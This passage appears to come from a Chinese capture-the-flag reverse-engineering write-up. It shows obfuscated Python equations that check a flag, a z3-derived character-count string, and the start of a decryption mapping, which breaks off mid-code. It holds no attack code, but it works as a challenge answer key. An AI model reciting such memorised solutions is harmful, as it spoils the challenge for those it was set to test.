punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">22</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">333</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">55</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">66</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">660</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">220</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">99</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">100</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">777</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2500</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">605</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">390</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">100</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">609</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">9999</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">210</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">232</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">23</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">25</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1551621</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">777</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">22</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6969</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">55</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">96</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">220</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">99</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">100</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">777</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">250</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">65</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">90</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">100</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">609</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">999</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">21</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">232</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">23</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">25</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">26</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">948348</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">97</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">22</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6969</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">56</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">96</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">96</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">99</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">707</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">250</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token operator\">-</span><span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">90</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token operator\">-</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">609</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">21</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">23</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">25</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">26</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">27</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">777044</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">177</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">22</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">699</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">64</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">56</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">66</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">96</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">99</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">707</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">250</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token operator\">-</span><span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token operator\">-</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">69</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">21</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">222</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">23</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">224</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">25</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">26</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">27</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">28</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">28</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">185016</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">77</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">96</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">99</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">707</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">250</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token operator\">-</span><span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token operator\">-</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">21</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">222</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">23</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">224</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">26</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token operator\">-</span><span class=\"token number\">58</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">27</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">28</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">29</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">29</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">130106</span><span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">if</span> <span class=\"token builtin\">all</span><span class=\"token punctuation\">(</span>ii1iIi1i11i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Congratulation!!!\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wrong_wrong!!!\"</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p>是计下flag里面每个字符出现的次数检验是否符合那个字符串的格式化的对应次数，</p>\n<p>将下面的z3解出可以得到一个字符串<strong>H1Z1N1U1C1T1F1{1a6d275f7-463}</strong></p>\n<p>一个字符一个数字配对，代表该字符在原flag中出现的次数。</p>\n<p>除去前面HZNUCTF{，将括号内的字母和对应数字做映射，利用原代码中的**”111111116257645365477364777645752361”**去一一对应。</p>\n<p>解密代码：</p>\n<pre class=\"language-Python\" data-language=\"Python\"><code class=\"language-Python\">from z3 import *\n\ndef decrypt(encrypted):\n    mapping &#x3D; &quot;6257645365477364777645752361&quot;\n    \n    char_map &#x3D; &#123;&#125;\n\n    remaining_map &#x3D; &#123;\n        &#39;6&#39;: &#39;a&#39;,\n        &#39;2&#39;: &#39;d&#39;,\n        &#39;5&#39;: &#39;7&#39;,\n        &#39;7&#39;: &#39;f&#39;,\n        &#39;4&#39;: &#39;-&#39;,\n        &#39;3&#39;: 